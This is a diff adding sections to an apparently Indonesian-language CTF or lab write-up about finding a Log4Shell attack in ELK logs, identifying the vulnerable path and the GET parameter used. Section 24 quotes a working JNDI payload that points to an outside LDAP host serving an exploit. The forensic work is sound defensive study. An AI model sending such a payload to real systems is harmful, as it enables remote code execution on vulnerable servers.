@@ -157,6 +157,25 @@ dan sampai kami menemukan tulisan pada suatu website yang menjelaskan struktur d
 
 ![image](https://user-images.githubusercontent.com/43168046/183132146-87025191-36e6-4aa6-a538-1c77ad33f12e.png)
 
+## 22. What is the path that is vulnerable to log4j?
+disini kami mencoba menggunakan parameter command umum yang digunakan attacker dalam menjalan log4shell "${jndi:ldap://". Namun disini kami tidak menemukan apa apa. sehingga kami pun memutar otak dan kami menemukan postingan https://i-3.co.id/monitor-infrastruktur-it-anda-secara-real-time-dengan-elk-stack/. pada postingan tersebut dijelaskan bahwa data pada indeks log merupakan hasil parsing dari data yang berasal dari index fileabet. dimana singkatnya filebeat merupakan index yang menimpan data mentah sebelum di parsing. sehingga kami mencoba mencari menggunakan parameter awal. dan benar kami menemukan sesuatu seperti pada gambar. 
+
+![image](https://user-images.githubusercontent.com/43168046/183141371-012f6e30-b9d8-4a12-959f-e80a1841ddcb.png)
+
+Berdasarkan gambar diasas path yang terindikasi memiliki vuln terhadap log4j adalah /admin/cores
+
+## 23.What is the GET request parameter used to deliver log4j payload?
+melalui parameter  "${jndi:ldap://", kami juga menemukan request get yang dipakai pada payload log4j tersebut. dimana attacke berusaha melakukan proses request get pada foo. 
+
+![image](https://user-images.githubusercontent.com/43168046/183142283-16e5313c-7b42-4208-af0a-764c212edf24.png)
+
+## 24. What is the JNDI payload that is connected to the LDAP port?
+berdasarkan pertanyaan sebelumnya dapat kita ketahui, payload dari log4j tersebut adalah : " {foo=${jndi:ldap://192.168.1.10:1389/Exploit}} "
+
+
+![image](https://user-images.githubusercontent.com/43168046/183142532-493cc815-01f6-470a-8b38-40ff840263cc.png)
+
+
 
 
 
